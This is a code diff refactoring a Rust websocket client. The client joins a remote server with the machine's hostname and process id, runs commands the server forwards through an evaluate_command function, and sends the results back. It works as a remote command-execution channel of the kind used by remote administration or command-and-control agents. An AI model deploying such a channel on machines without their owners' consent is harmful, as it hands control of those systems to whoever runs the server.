@@ -1,15 +1,18 @@
-use std::{collections::HashMap, env, net::TcpStream};
-
 use embedded_websocket::{
     framer::{Framer, FramerError},
     WebSocketClient, WebSocketOptions, WebSocketSendMessageType,
 };
 use serde_json::json;
+use std::net::TcpStream;
 use tokio::{sync::mpsc::UnboundedSender, time};
 
 use crate::eval_command;
 
 const PROTO: &str = "http";
+const ACTION_ID: &str = "id";
+const ACTION_JOIN: &str = "join";
+const ACTION_FORWARD: &str = "forward";
+const ACTION_RESPOND: &str = "respond";
 
 pub(crate) fn init(tx: UnboundedSender<String>, host: String) {
     println!("[{}] {}", "socket", "init");
@@ -35,6 +38,7 @@ async fn run_socket_async(tx: UnboundedSender<String>, host: String) -> Result<(
     let mut write_buf: [u8; 4000] = [0; 4000];
     let mut frame_buf: [u8; 4000] = [0; 4000];
     let mut socket_id = "non-id".to_string();
+    let identifier = eval_command::get_identifier();
 
     let mut ws_client = WebSocketClient::new_client(rand::thread_rng());
     let origin = format!("{}://{}", PROTO, host).to_owned();
@@ -54,9 +58,7 @@ async fn run_socket_async(tx: UnboundedSender<String>, host: String) -> Result<(
     tx.send("SOCKET.STARTED".to_string()).unwrap();
 
     // send join message
-    let env_vars: HashMap<String, String> = env::vars().collect();
-    let hostname = &env_vars["COMPUTERNAME"];
-    let message = format!("join<<<server<<<{}@{}", hostname, std::process::id());
+    let message = format!("{}<<<server<<<{}@{}", ACTION_JOIN, identifier.host, identifier.pid);
     websocket.write(WebSocketSendMessageType::Text, true, message.as_bytes())?;
 
     while let Some(data) = websocket.read_text(&mut frame_buf)? {
@@ -69,13 +71,13 @@ async fn run_socket_async(tx: UnboundedSender<String>, host: String) -> Result<(
         let payload = args[2];
 
         match action {
-            "id" => {
+            ACTION_ID => {
                 socket_id = payload.to_string();
             }
-            "forward" => {
+            ACTION_FORWARD => {
                 let result = eval_command::evaluate_command(payload);
                 let response = json!(result).to_string();
-                let message = format!("respond<<<{}<<<{}", socket_id, response).to_owned();
+                let message = format!("{}<<<{}<<<{}", ACTION_RESPOND, socket_id, response).to_owned();
                 websocket.write(WebSocketSendMessageType::Text, true, message.as_bytes())?;
             }
             _ => {
